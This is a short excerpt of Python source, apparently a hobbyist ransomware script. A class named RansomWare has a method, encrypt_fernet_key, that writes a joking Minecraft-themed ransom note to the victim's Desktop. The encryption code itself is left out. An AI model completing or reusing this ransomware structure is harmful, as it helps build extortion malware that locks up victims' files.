...
class RansomWare:
    ...
    def encrypt_fernet_key(self):
        ...
        with open(f'{self.sysRoot}\Desktop\important.txt','w') as fh:
            fh.write("Your chest of diamonds have been ransomed. If you want them back, contact us on discord. #epicminecraftplays #gg10ez #rekt")
